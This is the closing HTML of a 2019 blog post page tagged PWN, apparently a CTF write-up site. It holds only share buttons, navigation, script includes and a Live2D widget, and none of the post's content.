</div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2019-06-25</span><i class="fa fa-tag"></i><a class="tag" href="/tags/PWN/" title="PWN">PWN </a></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="javascript:(function(){EN_CLIP_HOST='http://www.evernote.com';try{var%20x=document.createElement('SCRIPT');x.type='text/javascript';x.src=EN_CLIP_HOST+'/public/bookmarkClipper.js?'+(new%20Date().getTime()/100000);document.getElementsByTagName('head')[0].appendChild(x);}catch(e){location.href=EN_CLIP_HOST+'/clip.action?url='+encodeURIComponent(location.href)+'&amp;title='+encodeURIComponent(document.title);}})();" ref="nofollow" target="_blank"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" href="http://twitter.com/home?status=,http://q1iq.top/pwnable-201906/,Q1IQ,pwnable-201906,;" target="_blank" rel="noopener"></a></div></div><div class="pagination"><ul class="clearfix"><li class="pre pagbuttons"><a class="btn" role="navigation" href="/ida%E6%89%93patch%E5%AD%A6%E4%B9%A0/" title="ida打patch学习">Post Anterior</a></li></ul></div></div></div></div></div><script src="/js/jquery.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":true,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"left","width":200,"height":400,"hOffset":400,"vOffset":0},"mobile":{"show":false},"react":{"opacity":0.7},"log":false});</script></body></html>